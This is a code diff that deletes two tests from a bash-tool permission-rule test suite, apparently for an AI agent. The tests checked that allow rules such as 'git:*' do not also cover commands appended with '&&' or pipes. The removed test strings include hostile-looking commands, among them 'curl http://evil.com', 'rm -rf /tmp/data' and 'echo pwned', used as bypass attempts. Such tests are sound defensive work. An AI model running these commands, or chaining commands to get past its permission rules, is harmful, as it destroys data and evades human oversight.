@@ -396,64 +396,6 @@ class BashToolMatchRuleTest(IsolatedAsyncioTestCase):
             ),
         )
 
-    async def test_match_rule_compound_command(self) -> None:
-        """A rule matches a compound command only if every subcommand
-        matches — an allow rule must not cover appended commands."""
-        # Prefix rule must not allow an arbitrary second command
-        self.assertFalse(
-            await self.bash_tool.match_rule(
-                "git:*",
-                {"command": "git status && echo pwned > /tmp/pwned"},
-            ),
-        )
-
-        # Suggestion-style two-word prefix rule
-        self.assertFalse(
-            await self.bash_tool.match_rule(
-                "git commit:*",
-                {"command": "git commit -m 'x' && curl http://evil.com"},
-            ),
-        )
-
-        # Substring rule must not cover a second command
-        self.assertFalse(
-            await self.bash_tool.match_rule(
-                "install",
-                {"command": "npm install && rm -rf /tmp/data"},
-            ),
-        )
-
-        # Wildcard rule must not cover a second command
-        self.assertFalse(
-            await self.bash_tool.match_rule(
-                "git *",
-                {"command": "git status && echo hi"},
-            ),
-        )
-
-        # Pipe segments count as separate subcommands
-        self.assertFalse(
-            await self.bash_tool.match_rule(
-                "git:*",
-                {"command": "git log | tee /tmp/log"},
-            ),
-        )
-
-    async def test_match_rule_compound_command_all_match(self) -> None:
-        """Compound commands whose every subcommand matches stay covered."""
-        self.assertTrue(
-            await self.bash_tool.match_rule(
-                "git:*",
-                {"command": "git add . && git commit"},
-            ),
-        )
-        self.assertTrue(
-            await self.bash_tool.match_rule(
-                "install",
-                {"command": "npm install && pip install"},
-            ),
-        )
-
     async def test_match_rule_escaped_characters(self) -> None:
         """Test match_rule with escaped characters."""
         # Test escaped asterisk
